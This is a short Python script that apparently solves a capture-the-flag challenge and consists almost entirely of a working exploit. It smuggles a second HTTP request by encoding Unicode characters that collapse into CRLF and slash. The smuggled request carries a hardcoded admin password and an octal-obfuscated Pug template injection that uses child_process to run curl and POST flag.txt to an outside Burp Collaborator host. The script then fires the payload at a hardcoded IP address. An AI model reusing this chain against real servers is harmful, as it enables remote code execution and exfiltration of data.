import requests
from requests.utils import quote
def toOct(str):
        r=""
        for i in str:
                if i>='a'and i<='z':
                        r+='\\'+oct(ord(i))[1:]
                else:
                        r+=i
        return r

SPACE=u'\u0220'.encode('utf-8')
CRLF=u'\u020d\u010a'.encode('utf-8') 
SLASH=u'\u022f'.encode('utf-8')

pug = toOct('''-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 9isd4lk6i70aj7npi52r1hpjwa20qp.burpcollaborator.net -X POST -d @flag.txt'))")()''').replace('"','%22').replace("'","%27")#' and " need to be double encoded
print quote(pug)

payload='sol'+SPACE+'HTTP'+SLASH+'1.1'+CRLF*2+'GET'+SPACE+SLASH+'flag'+SPACE+'HTTP'+SLASH+'1.1'+CRLF+'adminauth:'+SPACE+'secretpassword'+CRLF+'pug:'+SPACE+pug+CRLF+'test:'+SPACE

print payload

print quote(payload)

res=requests.get('http://3.6.38.186:8081/core?q='+quote(payload))

print res.content
